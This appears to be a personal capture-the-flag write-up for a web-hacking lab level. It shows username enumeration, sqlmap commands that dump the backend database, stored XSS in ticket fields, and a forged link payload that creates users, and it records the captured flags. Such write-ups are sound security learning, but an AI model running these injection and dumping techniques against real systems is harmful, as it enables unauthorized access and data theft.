Login has information disclosure on error message: `Invalid username`

![[Pasted image 20240910072533.png]]

I confirm the admin username. Interestingly Admin also works, so they app could be ignore capitalisation. 

**SQLMap on the id= parameter:** 

Database:

MariaDB

available databases [4]:                                                                                          
[*] information_schema
[*] level7
[*] mysql
[*] performance_schema

web application technology: OpenResty 1.25.3.2
back-end DBMS: MySQL >= 5.0 (MariaDB fork)

```php
Database: level7                                                                                                  
[2 tables]
+---------+
| tickets |
| users   |
+---------+
```

Contains things we already know about:
- Earlier posts
- admin account, plus the test accounts i made
- I didn't see the Admin account, so maybe that was a capitalisation issue, but it might be worth exploring to see what was happening there.

```php
Database: mysql
Table: proxies_priv
[1 entry]
+-----------+--------+---------+------------+---------------------+--------------+--------------+
| Host      | User   | Grantor | With_grant | Timestamp           | Proxied_host | Proxied_user |
+-----------+--------+---------+------------+---------------------+--------------+--------------+
| localhost | root   | <blank> | 1          | 2018-12-12 07:42:19 | <blank>      | <blank>      |
+-----------+--------+---------+------------+---------------------+--------------+--------------+
```

**Comment post:** 

`/ticket?id=2`
Both the title and the description is vulnerable to XSS.

![[Pasted image 20240910131516.png]]

**New User Request:** 

```php
sqlmap -r newuserreq.txt --dbs --dump
```

I capture the make a new user request and try sqlmap. 

`GET /newUser?username=capture&password=123&password2=123`

---

Looking at the lab again i annoyingly notice that the demo instance does not have any flags! So i'll fire up the live instance and just add it in this section instead of making a new one.

**Live Instance**

Looks like i first need to get into the app. I add on the create new user request to the url to see if i can create a user. 

![[Pasted image 20240911053953.png]]

`href="http://localhost/newUser?username=test&password=test&password2=test">TEST</a>`

Payload

```html
href="http://localhost/newUser?username=test&password=test&password2=test">TEST</a>
```

I add the payload to the `submit ticket` feature and then log in with user:test pass:test, this also fires the XSS i used earlier:

![[Pasted image 20240911055727.png]]

![[Pasted image 20240911055928.png]]

![[Pasted image 20240911055957.png]]

`^FLAG^9fd7adc96118cc48e8ae3ee2cafab912cb748763ba4de8e2052657e61f820ce6$FLAG$`

Now i just need to save the `GET /ticket?id=1` request, and use it with sqlmap to dump the database.

Capture ticket request in burpsuite, and save it to a file for sqlmap.

```php
sqlmap -r idreq.txt --dbs --batch
```

```php
sqlmap -r idreq.txt -D level7 --tables --batch  
```

```php
sqlmap -r idreq.txt -D level7 -T users --dump --batch 
```

![[Pasted image 20240911060612.png]]

`^FLAG^8de5f7fcfbc55844acef57ad80fedf964e98e876d9833c9ea75ab447f7f7ec59$FLAG$`

This completes the lab, and i'll have to pay more attention to the description next time. The demo is for exploring the app and it's functionality, the live was for exploit hunting.

---

**Completed:** _06:09 2024-09-11_



